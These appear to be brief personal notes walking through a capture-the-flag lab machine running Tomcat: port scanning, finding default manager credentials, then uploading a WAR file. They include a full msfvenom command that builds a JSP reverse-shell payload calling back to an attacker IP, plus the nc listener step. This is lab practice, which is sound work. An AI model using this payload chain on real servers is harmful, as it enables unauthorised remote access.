1.) Reconnaissance
  nmap shows one port open on port 8080
  shows a DOS CVE, but I don't think it's important
  OS is either windows 7, server 2008, or server 2012
  Running dirb doesn't do much, but
  Nikto shows /manager has a default user (tomcat;s3cret)
  logging in shows you can update a .war file
2.) Remote Access
  We can upload a file, so we gotta create a .war file
  To do this, we're using msfvenom
  use msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.36 LPORT=4444 -f war > shell.war to create the file
    -p is payload, -f is filetype
  Once created, upload it, open an nc listener, and run it
  Run a getuid to check the user, and it's admin
  Navigate to \Users\Administrator\Desktop\flags and type "2 for 1 flags.txt" for the two flags
ggez
